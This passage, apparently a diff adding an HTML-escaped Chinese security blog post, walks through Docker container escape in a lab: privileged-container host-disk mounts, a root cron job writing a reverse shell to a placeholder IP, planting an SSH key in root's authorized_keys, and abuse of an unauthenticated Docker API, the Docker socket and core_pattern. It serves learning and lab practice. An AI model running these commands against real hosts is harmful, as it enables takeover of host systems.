+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker pull ubuntu:18.04
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -it --privileged --rm ubuntu:18.04 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker8.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，这里已经进来了，我们先看正常情况下，我们怎么确认是特权容器的。
+先给命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /proc/self/status &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep CapEff
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker9.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;当你发现存在了很多个f的时候，基本上可以确定就是特权容器了。然后用&lt;code&gt;fdisk -l&lt;/code&gt; 命令用于列出系统中所有磁盘设备的分区信息。就可以创建一个目录，从而挂载到宿主机的目录下了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;fdisk -l # 列出系统中所有磁盘设备的分区信息
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir -p /xxxx 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount /dev/vda1 /xxxx # 根据分区信息选择，可能不止vda1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker10.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后就可以看到已经成功挂载了，并且可以看到宿主机的信息。
+然后我们就要进行逃逸了，这种情况给我们逃逸还是提供了很大帮助的，常见的就是以下两种方式。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;写定时任务反弹shell&lt;/li&gt;
+&lt;li&gt;设置SSH公钥&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;就这两种，我们来试一下吧。&lt;/p&gt;
+&lt;h3 id=&#34;定时任务反弹shell&#34;&gt;定时任务反弹shell
+&lt;/h3&gt;&lt;p&gt;在 /var/spool/cron 目录下新建一个 root 用户的定时任务&lt;br&gt;
+（如果/var/spool/cron/目录下存在crontabs目录，则在/var/spool/cron/crontabs目录下进行新建）
+这里我们去看一下这个目录先。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker11.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;很明显我们这里就是需要进入crontabs的目录的，然后写一个定时任务，如果主机可以出网，就可以反弹shell，这里我们把反弹shell的命令弄下来，但是不是我的服务器，我还是不打上去了，怕被揍。QAQ&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 反弹shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/ip/7777 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /test11/var/spool/cron/crontabs/root
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 定时写文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;* * * * * /bin/echo &amp;#34;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#34; &amp;gt;&amp;gt; /texun/phpinfo.php&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /test11/var/spool/cron/root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker12.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后就可以看到已经写好了，我们再开一个宿主机的终端，查看一下定时任务是否已经正确设置。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker13.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;命令稍微修改了一下，前面的也修改了，只有图片懒得再搞一个了。不过也已经证明了写定时任务是可以执行的。反弹shell也是可行的。&lt;/p&gt;
+&lt;h3 id=&#34;写ssh公钥&#34;&gt;写SSH公钥
+&lt;/h3&gt;&lt;p&gt;我们先生成一对公私钥出来先。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh-keygen -t rsa -b &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; -f my_key -N &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker14.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后我们就生成好了公钥和私钥，把私钥下载到本地来，公钥的内容准备在docker当中逃逸写入对应的目录。然后我们就去打命令，把公钥写进去。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;公钥内容&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /xxxx/root/.ssh/authorized_keys  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;600&lt;/span&gt; /xxxx/root/.ssh/authorized_keys
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker15.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;OK，已经可以看到成功写入了，然后我们就可以自己去连接一下试试了。差点忘了，要修改配置文件里面的。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PubkeyAuthentication yes  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PermitRootLogin yesAuthorizedKeysFile .ssh/authorized_keys
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;设置好之后我们就可以直接SSH连接了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh -i 私钥文件 root@ip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker16.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到我们成功的SSH连接上了这台主机。OK，差不多这样。&lt;/p&gt;
+&lt;h2 id=&#34;docker-api-未授权&#34;&gt;Docker api 未授权
+&lt;/h2&gt;&lt;p&gt;这个的话，我们需要去下载一个靶场，
+&lt;a class=&#34;link&#34; href=&#34;https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/vulhub/vulhub/blob/master/docker/unauthorized-rce&lt;/a&gt;
+从这个链接里面，下载下来了Dockerfile，docker-compose.yml，docker-entrypoint.sh。这三个文件，然后放到服务器中，直接执行命令即可。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker compose build
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker compose up -d
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后我们就可以访问我们的服务器的2375端口，就可以看到我们运行起来的docker容器。
+可以访问/version或者/info看一些信息。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker17.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后我们就可以去打这个漏洞了，然后我们先从服务器里面进入我们的靶机。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it docker-docker-1 /bin/sh
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifconfig
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker18.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到靶机的IP是172.21.0.2。然后我们就可以用攻击机远程连接他了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker -H tcp://ip:2375 ps
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里只提了这个啊，后面自动省略掉&lt;code&gt;-H&lt;/code&gt;这一段，只说要打什么命令。我们来试一下吧。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker19.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到，docker ps是成功执行了，但是为什么没有docker容器呢，因为这是这个docker服务管理的，而不是宿主机管理的，这个有点绕，我简单画图描述一下。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker20.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可能颜色有点深，抱歉，但是大体上这个逻辑，就导致了，我们可以通过docker远程连接2375的服务，并且创建存在特殊挂载到特权容器，后续就回到第一个特权容器的打法了，后续不多解释，来看一下怎么创建。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker -H tcp://ip:2375 run -id -v /:/tmp alpine:latest
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker -H tcp://ip:2375 ps  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker -H tcp://ip:2375 &lt;span class=&#34;nb&#34;&gt;exec&lt;/span&gt; -it 容器ID sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker21.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这里用了之前一个出过的题目的镜像用。但是我这个容器比较简陋，所以这里打的命令是直接挂载了，挂载了/host的目录，我们直接看这个目录即可。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker22.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到，就是我们前面的那个docker环境，因此我们就有了一条攻击线路，先通过这里的挂载，反弹shell拿到这个docker服务的shell，再逃逸出去就到宿主机里，大体思路就是这样了。实际情况中呢其实不是docker容器起docker服务，而是主机起docker服务，我们就可以直接到宿主机了。&lt;/p&gt;
+&lt;h2 id=&#34;docker-socket-逃逸&#34;&gt;Docker Socket 逃逸
+&lt;/h2&gt;&lt;p&gt;这个其实跟上面的有点像，原理类似，后续操作不打，看看是什么个意思。&lt;/p&gt;
+&lt;p&gt;Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信，实现执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。&lt;/p&gt;
+&lt;p&gt;简单来说就是，就是挂载这个这个文件之后，我们就可以进行通信了，去操作docker服务的宿主机，然后进行创建，删除，修改等。那就很简单了，后面都是跟前面的api逃逸手法一样了。&lt;/p&gt;
+&lt;p&gt;还是用我们前面的ubuntu 18.04镜像，命令如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -itd -v /var/run/docker.sock:/var/run/docker.sock --name my_ubuntu ubuntu:18.04
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -lah /var/run/docker.sock
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker23.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后这个容器里面需要有docker命令，没有的话我们也可以下载一下，然后再打就行了，后续其实没多少差别，这里就创一个特权挂载到容器，就不打了。懒惰这一块。&lt;/p&gt;
+&lt;h2 id=&#34;procfs危险挂载&#34;&gt;Procfs危险挂载
+&lt;/h2&gt;&lt;p&gt;这里也是一个危险挂载，但是不一定需要特权容器了，就是比较方便。我们来挂载一下吧。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -it --rm -v /proc/sys/kernel/core_pattern:/test2/proc/sys/kernel/core_pattern ubuntu:18.04 /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker24.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这个检查有没有问题很简单，这里也显示了，直接find，如果发现有两个文件，就基本说明挂载了这个目录了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find / -name core_pattern
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;介绍一下这个文件有什么作用：
+&lt;code&gt;/proc/sys/kernel/core_pattern&lt;/code&gt;文件是负责 进程崩溃时 的内存数据转储，当第一个字符是管道符&lt;code&gt;|&lt;/code&gt;时，后面的部分会以命令行的方式进行解析并运行。并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。&lt;br&gt;
+利用该解析方式，可以进行容器逃逸。
+所以我们现在找一下我们这个容器的工作目录是在宿主机的哪里。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /proc/mounts &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xargs -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt; -n &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep workdir
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker25.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
